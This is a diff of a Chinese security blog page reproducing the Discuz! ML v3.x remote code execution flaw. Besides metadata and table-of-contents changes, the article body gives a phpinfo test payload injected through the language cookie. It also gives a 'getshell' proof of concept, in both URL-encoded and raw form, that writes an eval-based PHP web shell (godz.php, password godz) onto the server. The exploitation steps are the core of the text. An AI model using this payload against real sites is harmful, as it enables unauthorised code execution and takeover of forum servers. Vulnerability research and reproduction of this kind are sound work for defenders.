@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="@[TOC](Discuz Ml v3.x 前台Getshell姿势) 1.漏洞描述Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。 2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程">
+    <meta name="description" content="Discuz Ml v3.x 前台Getshell姿势 1.漏洞描述 2.原理 3.影响版本 4.利用过程 4.getshell POC 请勿用于非法用途  1.漏洞描述Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。 2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Discuz Ml v3.x 前台Getshell姿势 Discuz漏洞">
 <meta property="og:url" content="https://godzeo.github.io/2019/07/14/Discuz%20Ml%20v3.x%20%E5%89%8D%E5%8F%B0Getshell%E5%A7%BF%E5%8A%BF%20Discuz%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="@[TOC](Discuz Ml v3.x 前台Getshell姿势) 1.漏洞描述Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。 2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程">
+<meta property="og:description" content="Discuz Ml v3.x 前台Getshell姿势 1.漏洞描述 2.原理 3.影响版本 4.利用过程 4.getshell POC 请勿用于非法用途  1.漏洞描述Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。 2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190714182907753.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190714183142897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
@@ -19,9 +19,14 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190714183737657.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190714184513361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2019-07-14T11:03:10.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:05.355Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:08.193Z">
 <meta property="article:author" content="Zeo">
-<meta property="article:tag" content="Discuz漏洞">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190714182907753.png">
     
@@ -56,6 +61,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -118,7 +125,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-漏洞描述"><span class="toc-number">1.</span> <span class="toc-text">1.漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number">2.</span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number">3.</span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number">4.</span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-getshell-POC"><span class="toc-number">5.</span> <span class="toc-text">4.getshell POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#请勿用于非法用途"><span class="toc-number">6.</span> <span class="toc-text">请勿用于非法用途</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Discuz-Ml-v3-x-前台Getshell姿势"><span class="toc-number">1.</span> <span class="toc-text">Discuz Ml v3.x 前台Getshell姿势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-漏洞描述"><span class="toc-number"></span> <span class="toc-text">1.漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number"></span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number"></span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number"></span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-getshell-POC"><span class="toc-number"></span> <span class="toc-text">4.getshell POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#请勿用于非法用途"><span class="toc-number"></span> <span class="toc-text">请勿用于非法用途</span></a>
     </div>
   </span>
 </div>
@@ -151,16 +158,11 @@
       
     <div class="article-category">
         <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a>
+        <a class="category-link" href="/categories/WEB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB漏洞复现和分析</a>
     </div>
 
 
       
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/Discuz%E6%BC%8F%E6%B4%9E/" rel="tag">Discuz漏洞</a>
-    </div>
-
 
     </div>
   </header>
@@ -169,7 +171,16 @@
   <div class="content" itemprop="articleBody">
     <a id="more"></a>
 
-<p>@[TOC](Discuz Ml v3.x 前台Getshell姿势)</p>
+
+
+<h3 id="Discuz-Ml-v3-x-前台Getshell姿势"><a href="#Discuz-Ml-v3-x-前台Getshell姿势" class="headerlink" title="Discuz Ml v3.x 前台Getshell姿势"></a>Discuz Ml v3.x 前台Getshell姿势</h3><ul>
+<li><a href="#1_2">1.漏洞描述</a></li>
+<li><a href="#2_10">2.原理</a></li>
+<li><a href="#3_20">3.影响版本</a></li>
+<li><a href="#4_26">4.利用过程</a></li>
+<li><a href="#4getshell_POC_46">4.getshell POC</a></li>
+<li><a href="#_68">请勿用于非法用途</a></li>
+</ul>
 <h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。</p>
 <p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。</p>
 <h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote>
@@ -178,16 +189,18 @@
 <h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p><strong>Discuz! ML v.3.4<br>Discuz! ML v.3.3<br>Discuz! ML v.3.2</strong></p>
 <h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>简而言之，通过cookie传入payload，构造好的payload被写入template文件中:</p>
 <p>注意这是国际版的，不是国内的那种，一般要有语言选择的才行，大部分都是国外的论坛<br>类似于有这种的<br><img src="https://img-blog.csdnimg.cn/20190714182907753.png" alt="在这里插入图片描述"></p>
-<p>问题出在  </p>
-<pre><code>XXXX_language=</code></pre><p>测试PAYLOAD</p>
+<p>问题出在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXX_language&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>测试PAYLOAD</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXX_language&#x3D;&#39;.phpinfo().&#39;;</span><br></pre></td></tr></table></figure>
+
 <p>XXX自己改一下<br><img src="https://img-blog.csdnimg.cn/20190714183142897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>GO一下看结果<br><img src="https://img-blog.csdnimg.cn/20190714183208411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h2 id="4-getshell-POC"><a href="#4-getshell-POC" class="headerlink" title="4.getshell POC"></a>4.getshell POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27.+file_put_contents%28%27godz.php%27%2Curldecode%28%27%253c%253fphp+%2520eval%28%2524_%2547%2545%2554%255b%2522godz%2522%255d%29%253b%253f%253e%27%29%29.%27</span><br></pre></td></tr></table></figure>
 
 <p>原始的payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;.+file_put_contents(&#39;godz.php&#39;,urldecode(&#39;&lt;?php  eval($_GET[&quot;godz&quot;]);?&gt;&#39;)).&#39;</span><br></pre></td></tr></table></figure>
-
 
 <p><img src="https://img-blog.csdnimg.cn/20190714183737657.png" alt="在这里插入图片描述"></p>
 <p><strong>访问网站生成木马文件,godz.php 密码为godz</strong><br>验证木马</p>
@@ -223,7 +236,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-漏洞描述"><span class="toc-number">1.</span> <span class="toc-text">1.漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number">2.</span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number">3.</span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number">4.</span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-getshell-POC"><span class="toc-number">5.</span> <span class="toc-text">4.getshell POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#请勿用于非法用途"><span class="toc-number">6.</span> <span class="toc-text">请勿用于非法用途</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Discuz-Ml-v3-x-前台Getshell姿势"><span class="toc-number">1.</span> <span class="toc-text">Discuz Ml v3.x 前台Getshell姿势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-漏洞描述"><span class="toc-number"></span> <span class="toc-text">1.漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number"></span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number"></span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number"></span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-getshell-POC"><span class="toc-number"></span> <span class="toc-text">4.getshell POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#请勿用于非法用途"><span class="toc-number"></span> <span class="toc-text">请勿用于非法用途</span></a>
     </div>
 
     <div id="share-footer" style="display: none">
